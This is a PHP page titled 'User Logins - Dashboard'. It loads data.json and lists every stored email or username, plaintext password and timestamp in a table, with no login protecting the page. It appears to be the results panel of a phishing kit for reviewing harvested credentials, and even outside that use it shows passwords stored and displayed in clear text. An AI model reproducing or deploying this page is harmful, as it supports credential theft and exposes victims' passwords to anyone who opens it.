<?php
// Load the JSON data from file
$dataFile = 'data.json';
$data = [];

if (file_exists($dataFile)) {
    $jsonContent = file_get_contents($dataFile);
    $data = json_decode($jsonContent, true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>User Logins - Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 20px;
      background: #f2f2f2;
    }

    .container {
      max-width: 960px;
      margin: auto;
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
    }

    h1 {
      text-align: center;
      color: #333;
      margin-bottom: 30px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      overflow-x: auto;
    }

    thead {
      background-color: #4a90e2;
      color: white;
    }

    th, td {
      text-align: left;
      padding: 12px 15px;
      border-bottom: 1px solid #ddd;
    }

    tr:hover {
      background-color: #f5f5f5;
    }

    @media (max-width: 768px) {
      table, thead, tbody, th, td, tr {
        display: block;
      }

      thead {
        display: none;
      }

      tr {
        margin-bottom: 15px;
        border: 1px solid #ccc;
        border-radius: 8px;
        padding: 10px;
        background: #fafafa;
      }

      td {
        display: flex;
        justify-content: space-between;
        padding: 10px;
      }

      td::before {
        content: attr(data-label);
        font-weight: bold;
        flex: 1;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Login Records</h1>
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>Email or Username</th>
          <th>Password</th>
          <th>Timestamp</th>
        </tr>
      </thead>
      <tbody>
        <?php if (!empty($data)): ?>
          <?php foreach ($data as $index => $entry): ?>
            <tr>
              <td data-label="#"> <?= $index + 1 ?> </td>
              <td data-label="Email or Username"><?= htmlspecialchars($entry['email_or_username']) ?></td>
              <td data-label="Password"><?= htmlspecialchars($entry['password']) ?></td>
              <td data-label="Timestamp"><?= htmlspecialchars($entry['timestamp']) ?></td>
            </tr>
          <?php endforeach; ?>
        <?php else: ?>
          <tr>
            <td colspan="4" style="text-align:center;">No data found.</td>
          </tr>
        <?php endif; ?>
      </tbody>
    </table>
  </div>
</body>
</html>
